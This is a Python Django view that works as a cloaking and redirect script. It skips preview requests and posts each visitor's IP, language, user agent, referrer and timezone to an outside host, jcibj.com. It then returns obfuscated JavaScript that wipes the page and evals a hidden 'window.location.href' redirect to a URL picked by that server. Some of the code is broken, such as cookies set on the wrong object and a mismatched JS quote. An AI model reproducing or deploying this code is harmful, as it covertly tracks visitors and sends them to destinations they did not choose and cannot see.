from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from datetime import datetime
import requests


@csrf_exempt
def handle_request(request):
    if request.headers.get("HTTP_X_PURPOSE") != "preview":
        if request.method == 'POST':
            if 'tz' in request.POST:
                date = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
                id = "469726"
                uid = "fxzt97mifoohr0nypa7q4q36k"
                qu = request.POST.get("qu")
                url = "https://jcibj.com/pcl.php"
                data = {
                    "date": date,
                    "lan": request.headers.get("ACCEPT_LANGUAGE"),
                    "ref": request.POST.get("r"),
                    "ip": request.headers.get("X_FORWARDED_FOR"),
                    "ipr": request.headers.get("X_FORWARDED_FOR"),
                    "sn": request.POST.get("sn"),
                    "requestUri": request.POST.get("rui"),
                    "query": qu,
                    "ua": request.headers.get("USER_AGENT"),
                    "co": request.POST.get("co"),
                    "tz": request.POST.get("tz"),
                    "he": request.POST.get("he"),
                    "user_id": uid,
                    "id": id
                }
                response = requests.post(url, data=data)
                arr = response.text.split(",")
                print(url)
                print(arr)
                print(response.text)

                if qu:
                    q = "&" + qu if "?" in arr[1] else "?" + qu
                else:
                    q = ""

                if arr[0] == "true":
                    if "sp.php" in arr[1]:
                        q = "?" + qu
                    if arr[7]:
                        expires = int(arr[9]) * 60 * 60 * 24
                        response.set_cookie(arr[7], arr[8], max_age=expires)
                    if arr[2]:
                        if arr[4] == "1" or arr[4] == "3":
                            expires = int(arr[3]) * 60 * 60 * 24
                            response.set_cookie("_event", arr[6], max_age=expires)
                    return HttpResponse(c(arr[1], q))

                elif arr[0] == "false":
                    f = q if arr[5] else ""
                    if arr[2]:
                        if arr[4] == "2" or arr[4] == "3":
                            expires = int(arr[3]) * 60 * 60 * 24
                            response.set_cookie("_event", arr[6] + "b", max_age=expires)
                    return HttpResponse(c(arr[1], f))

                else:
                    if arr[2]:
                        if arr[4] == "2" or arr[4] == "3":
                            expires = int(arr[3]) * 60 * 60 * 24
                            response.set_cookie("_event", arr[6] + "b", max_age=expires)
                    return HttpResponse(c())

    return HttpResponse(status=403)  # Forbidden


def c(u=None, q=None):
    if u is None:
        return 'console.log("Hide element");'
    else:
        u = u + q
        a = [ord(char) for char in u]
        u = ','.join(map(str, a[::-1]))
        return f'''
            function rS(s) {{
                nS = "";
                for (let i = s.length - 1; i >= 0; i--) {{
                    nS += s[i];
                }}
                const a = nS.split(",");
                const u = String.fromCharCode.apply(null, a);
                return u;
            }}

            let u = "", s = "", c = "";

            document.querySelector("body").remove();
            document.querySelector("html").insertAdjacentHTML("beforeend", '<div style="margin-top:8%;background-color:white;text-align:center;font-size:40px;">Please Wait for Page to Load...</div>');

            s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");
            u = rS("{u}");
            c = s + '\'' + u + '\'';
            eval(c);

            document.querySelector("html").style.display = "block';
'''